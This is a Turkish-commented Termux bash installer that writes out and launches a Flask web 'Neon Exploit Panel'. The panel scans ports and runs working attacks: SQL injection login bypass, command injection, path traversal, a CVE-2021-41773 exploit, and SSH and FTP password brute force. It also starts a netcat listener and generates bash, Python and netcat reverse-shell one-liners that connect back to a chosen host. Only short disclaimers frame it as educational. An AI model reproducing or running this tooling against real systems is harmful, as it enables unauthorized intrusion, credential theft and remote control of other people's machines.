#!/data/data/com.termux/files/usr/bin/bash
set -e

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${CYAN}[+] Neon Exploit Panel - Güvenli Kurulum${NC}"
echo -e "${CYAN}[+] Sadece eğitim ve yetkilendirilmiş testler için kullanın.${NC}"

# Android API seviyesini otomatik al
API_LEVEL=$(getprop ro.build.version.sdk 2>/dev/null || echo "28")
export ANDROID_API_LEVEL=$API_LEVEL
echo -e "${YELLOW}[+] Android API seviyesi: $ANDROID_API_LEVEL${NC}"

# 1. Sistem güncelleme
echo -e "${GREEN}[1/6] Sistem güncelleniyor...${NC}"
pkg update -y | while IFS= read -r line; do echo "  $line"; done
pkg install -y python python-pip netcat-openbsd | while IFS= read -r line; do echo "  $line"; done

# 2. Rust kontrolü (cryptography için)
echo -e "${GREEN}[2/6] Rust kontrol ediliyor...${NC}"
if ! command -v rustc &> /dev/null; then
    echo -e "${YELLOW}Rust bulunamadı, kuruluyor...${NC}"
    pkg install -y rust | while IFS= read -r line; do echo "  $line"; done
else
    echo -e "${GREEN}Rust zaten kurulu.${NC}"
fi

# 3. Python kütüphaneleri (flask, requests)
echo -e "${GREEN}[3/6] Python kütüphaneleri yükleniyor...${NC}"
pip install flask requests --progress-bar on | while IFS= read -r line; do echo "  $line"; done

# 4. Paramiko (dene, başarısız olursa devam et)
echo -e "${GREEN}[4/6] Paramiko yükleniyor...${NC}"
PARAMIKO_OK=false
echo -e "${YELLOW}Paramiko pip ile deneniyor...${NC}"
if pip install paramiko --progress-bar on 2>&1 | while IFS= read -r line; do echo "  $line"; done; then
    PARAMIKO_OK=true
    echo -e "${GREEN}Paramiko başarıyla yüklendi.${NC}"
else
    echo -e "${RED}Paramiko pip ile kurulamadı. SSH brute force devre dışı kalacak.${NC}"
    # Termux'da belki farklı isimle var mı kontrol et
    if pkg list-installed | grep -q paramiko; then
        echo -e "${GREEN}Paramiko Termux paketi zaten kurulu.${NC}"
        PARAMIKO_OK=true
    else
        echo -e "${YELLOW}Termux deposunda python-paramiko aranıyor...${NC}"
        if pkg show python-paramiko &>/dev/null; then
            pkg install -y python-paramiko | while IFS= read -r line; do echo "  $line"; done
            PARAMIKO_OK=true
            echo -e "${GREEN}Paramiko Termux paketi ile yüklendi.${NC}"
        else
            echo -e "${RED}Paramiko kurulamadı. SSH brute force kullanılamayacak.${NC}"
        fi
    fi
fi

# 5. Rastgele port seç
PANEL_PORT=$(( RANDOM % 1000 + 5000 ))

# 6. Python kodunu geçici dosyaya yaz (paramiko durumuna göre modül ayarlanacak)
echo -e "${GREEN}[5/6] Python panel kodu oluşturuluyor...${NC}"
cat > /data/data/com.termux/files/usr/tmp/neon_panel_fixed.py << EOF
import random
import socket
import threading
import time
import json
import subprocess
import os
import sys
import ftplib
import requests
from flask import Flask, render_template_string, request, jsonify

# paramiko yüklü mü kontrol et (başarısız olursa False)
PARAMIKO_AVAILABLE = False
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    pass

app = Flask(__name__)

# ---------- Yapılandırma ----------
LOG_FILE = "exploit_log.txt"
OPEN_PORTS = []
TARGET_IP = "127.0.0.1"
listener_process = None

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.ctime()}] {message}\n")
    print(message)

# ---------- Port tarayıcı ----------
def scan_port(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            service = "unknown"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = s.recv(1024).decode(errors='ignore')
                if "SSH" in banner:
                    service = "ssh"
                elif "FTP" in banner:
                    service = "ftp"
                elif "HTTP" in banner:
                    service = "http"
                s.close()
            except:
                pass
            return port, service
    except:
        pass
    return None

def scan_ports(ip, ports):
    results = []
    threads = []
    lock = threading.Lock()
    def worker(port):
        res = scan_port(ip, port)
        if res:
            with lock:
                results.append(res)
    for port in ports:
        t = threading.Thread(target=worker, args=(port,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return results

# ---------- Exploit modülleri ----------
def sqli_exploit(ip, port):
    url = f"http://{ip}:{port}/login"
    payload = {"username": "' OR 1=1 --", "password": "x"}
    try:
        r = requests.post(url, data=payload, timeout=3, allow_redirects=False)
        if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
            return {"success": True, "message": "SQL Injection başarılı! Giriş yapıldı."}
        else:
            return {"success": False, "message": "SQL Injection başarısız."}
    except Exception as e:
        return {"success": False, "error": str(e)}

def cmd_injection(ip, port):
    url = f"http://{ip}:{port}/ping"
    payload = {"ip": "127.0.0.1; id"}
    try:
        r = requests.post(url, data=payload, timeout=3)
        if "uid=" in r.text:
            return {"success": True, "message": "Command Injection başarılı!"}
        else:
            return {"success": False, "message": "Command Injection başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def path_traversal(ip, port):
    url = f"http://{ip}:{port}/../../../../etc/passwd"
    try:
        r = requests.get(url, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": "Path Traversal başarılı! /etc/passwd okundu."}
        else:
            return {"success": False, "message": "Path Traversal başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def ssh_brute(ip, port, userlist=["root", "admin"], passlist=["password", "123456"]):
    if not PARAMIKO_AVAILABLE:
        return {"success": False, "message": "Paramiko kurulu değil, SSH brute kullanılamaz."}
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in userlist:
        for pwd in passlist:
            try:
                client.connect(ip, port=port, username=user, password=pwd, timeout=3)
                client.close()
                return {"success": True, "message": f"SSH brute success: {user}:{pwd}"}
            except:
                continue
    return {"success": False, "message": "SSH brute failed"}

def ftp_brute(ip, port, userlist=["root", "admin"], passlist=["password", "123456"]):
    for user in userlist:
        for pwd in passlist:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port)
                ftp.login(user, pwd)
                ftp.quit()
                return {"success": True, "message": f"FTP brute success: {user}:{pwd}"}
            except:
                continue
    return {"success": False, "message": "FTP brute failed"}

def start_listener(port):
    global listener_process
    if listener_process and listener_process.poll() is None:
        return {"success": False, "message": "Listener already running"}
    cmd = f"nc -lvnp {port}"
    listener_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return {"success": True, "message": f"Listener started on port {port}"}

def generate_payload(ip, port, type="bash"):
    if type == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif type == "python":
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif type == "nc":
        return f"nc -e /bin/sh {ip} {port}"
    else:
        return "Unknown type"

def cve_2021_41773(ip, port):
    url = f"http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    try:
        r = requests.get(url, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": "CVE-2021-41773 başarılı! /etc/passwd okundu."}
        else:
            return {"success": False, "message": "CVE-2021-41773 başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

exploit_functions = {
    "sqli": sqli_exploit,
    "cmd_inj": cmd_injection,
    "path_trav": path_traversal,
    "ssh_brute": ssh_brute,
    "ftp_brute": ftp_brute,
    "cve_2021_41773": cve_2021_41773
}

# ---------- Web arayüzü (Neon Tema) ----------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>⚡ Neon Exploit Panel ⚡</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0f0f;
            font-family: 'Courier New', monospace;
            color: #0f0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: auto;
        }
        h1 {
            font-size: 3em;
            text-align: center;
            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
            margin-bottom: 20px;
        }
        .neon-card {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #0f0;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 10px rgba(0,255,0,0.3);
        }
        .neon-card h2 {
            border-bottom: 1px solid #0f0;
            margin-bottom: 15px;
            text-shadow: 0 0 3px #0f0;
        }
        input, select, button {
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px 12px;
            margin: 5px;
            font-family: monospace;
        }
        button {
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 5px #0f0;
        }
        .port-list {
            list-style: none;
            padding: 0;
        }
        .port-item {
            background: #1a2a1a;
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .result-box {
            background: #111;
            border: 1px solid #0f0;
            padding: 10px;
            white-space: pre-wrap;
            font-size: 0.9em;
            margin-top: 10px;
            max-height: 300px;
            overflow: auto;
        }
        .neon-tab {
            display: inline-block;
            padding: 10px 20px;
            background: #0a0f0f;
            border: 1px solid #0f0;
            cursor: pointer;
        }
        .tab-content {
            display: none;
            padding: 15px;
        }
        .active-tab {
            background: #0f0;
            color: #000;
        }
        hr {
            border-color: #0f0;
        }
        a {
            color: #0f0;
        }
    </style>
    <script>
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
            document.getElementById(tabId).style.display = 'block';
            document.querySelectorAll('.neon-tab').forEach(t => t.classList.remove('active-tab'));
            event.target.classList.add('active-tab');
        }

        function scanPorts() {
            let ip = document.getElementById('target_ip').value;
            fetch('/scan?ip=' + ip)
                .then(r => r.json())
                .then(data => {
                    let portList = document.getElementById('portList');
                    portList.innerHTML = '';
                    data.ports.forEach(p => {
                        let li = document.createElement('li');
                        li.className = 'port-item';
                        li.innerHTML = `Port ${p.port} (${p.service}) 
                            <select id="exploit_${p.port}">
                                <option value="sqli">SQL Injection</option>
                                <option value="cmd_inj">Command Injection</option>
                                <option value="path_trav">Path Traversal</option>
                                <option value="ssh_brute">SSH Brute Force</option>
                                <option value="ftp_brute">FTP Brute Force</option>
                                <option value="cve_2021_41773">CVE-2021-41773</option>
                            </select>
                            <button onclick="runExploit(${p.port})">Exploit Et</button>`;
                        portList.appendChild(li);
                    });
                });
        }

        function runExploit(port) {
            let exploit = document.getElementById(`exploit_${port}`).value;
            let ip = document.getElementById('target_ip').value;
            fetch(`/exploit/${exploit}?ip=${ip}&port=${port}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('result').innerText = JSON.stringify(data, null, 2);
                });
        }

        function startListener() {
            let port = document.getElementById('listen_port').value;
            fetch(`/start_listener?port=${port}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('listener_result').innerText = JSON.stringify(data);
                });
        }

        function generatePayload() {
            let ip = document.getElementById('payload_ip').value;
            let port = document.getElementById('payload_port').value;
            let type = document.getElementById('payload_type').value;
            fetch(`/generate_payload?ip=${ip}&port=${port}&type=${type}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('payload_result').innerText = data.payload;
                });
        }
    </script>
</head>
<body>
<div class="container">
    <h1>⚡ NEON EXPLOIT PANEL ⚡</h1>
    <div class="neon-card">
        <div style="display: flex; gap: 10px;">
            <div class="neon-tab" onclick="showTab('target')">🎯 Hedef</div>
            <div class="neon-tab" onclick="showTab('scan')">🔍 Port Tarama</div>
            <div class="neon-tab" onclick="showTab('exploit')">💀 Exploit'ler</div>
            <div class="neon-tab" onclick="showTab('reverse')">🔄 Reverse Shell</div>
            <div class="neon-tab" onclick="showTab('log')">📜 Log</div>
        </div>
    </div>

    <!-- Target Tab -->
    <div id="target" class="tab-content" style="display:block;">
        <div class="neon-card">
            <h2>Hedef IP</h2>
            <input type="text" id="target_ip" value="127.0.0.1" placeholder="IP adresi">
            <button onclick="scanPorts()">Portları Tara</button>
        </div>
    </div>

    <!-- Scan Tab -->
    <div id="scan" class="tab-content">
        <div class="neon-card">
            <h2>Port Tarama Sonuçları</h2>
            <ul id="portList" class="port-list"></ul>
        </div>
    </div>

    <!-- Exploit Tab -->
    <div id="exploit" class="tab-content">
        <div class="neon-card">
            <h2>Exploit Sonuçları</h2>
            <div id="result" class="result-box">Sonuçlar burada...</div>
        </div>
    </div>

    <!-- Reverse Shell Tab -->
    <div id="reverse" class="tab-content">
        <div class="neon-card">
            <h2>Reverse Shell Dinleyici</h2>
            <input type="text" id="listen_port" placeholder="Port">
            <button onclick="startListener()">Dinleyici Başlat</button>
            <div id="listener_result" class="result-box"></div>
        </div>
        <div class="neon-card">
            <h2>Payload Oluştur</h2>
            <input type="text" id="payload_ip" placeholder="IP">
            <input type="text" id="payload_port" placeholder="Port">
            <select id="payload_type">
                <option value="bash">Bash</option>
                <option value="python">Python</option>
                <option value="nc">Netcat</option>
            </select>
            <button onclick="generatePayload()">Oluştur</button>
            <div id="payload_result" class="result-box"></div>
        </div>
    </div>

    <!-- Log Tab -->
    <div id="log" class="tab-content">
        <div class="neon-card">
            <h2>İşlem Günlüğü</h2>
            <pre id="log_content" class="result-box"></pre>
            <button onclick="fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log_content').innerText=t)">Yenile</button>
        </div>
    </div>
</div>

<script>
    fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log_content').innerText=t);
</script>
</body>
</html>
"""

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/scan')
def scan():
    ip = request.args.get('ip', '127.0.0.1')
    ports_to_scan = [21,22,80,443,8080,3306,5432,25,110,143,445,139]
    log(f"Tarama başlatıldı: {ip}")
    results = scan_ports(ip, ports_to_scan)
    port_list = [{"port": p, "service": s} for p, s in results]
    return jsonify({"ports": port_list})

@app.route('/exploit/<name>')
def run_exploit(name):
    ip = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port')
    if not port:
        return jsonify({"error": "Port belirtilmeli"})
    port = int(port)
    log(f"Exploit çalıştırılıyor: {name} hedef {ip}:{port}")
    if name in exploit_functions:
        try:
            result = exploit_functions[name](ip, port)
            log(f"Exploit {name} sonucu: {result}")
            return jsonify(result)
        except Exception as e:
            log(f"Hata: {str(e)}")
            return jsonify({"error": str(e)})
    else:
        return jsonify({"error": "Bilinmeyen exploit"})

@app.route('/start_listener')
def start_listener_route():
    port = request.args.get('port')
    if not port:
        return jsonify({"error": "Port belirtilmeli"})
    port = int(port)
    log(f"Reverse shell dinleyici başlatılıyor: port {port}")
    return jsonify(start_listener(port))

@app.route('/generate_payload')
def generate_payload_route():
    ip = request.args.get('ip')
    port = request.args.get('port')
    typ = request.args.get('type', 'bash')
    if not ip or not port:
        return jsonify({"error": "IP ve port belirtilmeli"})
    payload = generate_payload(ip, port, typ)
    return jsonify({"payload": payload})

@app.route('/log')
def show_log():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
        return content
    except:
        return "Log dosyası henüz oluşturulmadı."

if __name__ == '__main__':
    port = '''$PANEL_PORT'''
    print(f"\n[+] Neon Exploit Panel başlatılıyor: http://localhost:{port}")
    print("[!] Yalnızca eğitim ve yetkilendirilmiş testler için kullanın.\n")
    app.run(host='0.0.0.0', port=int(port), debug=False)
EOF

# 7. Python dosyasındaki port değişkenini güncelle
sed -i "s/\$PANEL_PORT/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_panel_fixed.py

echo -e "${GREEN}[6/6] Panel başlatılıyor...${NC}"
echo -e "${CYAN}Adres: http://localhost:$PANEL_PORT${NC}"
echo -e "${RED}[!] Ctrl+C ile durdurabilirsiniz.${NC}"

# 8. Python panelini çalıştır
python /data/data/com.termux/files/usr/tmp/neon_panel_fixed.py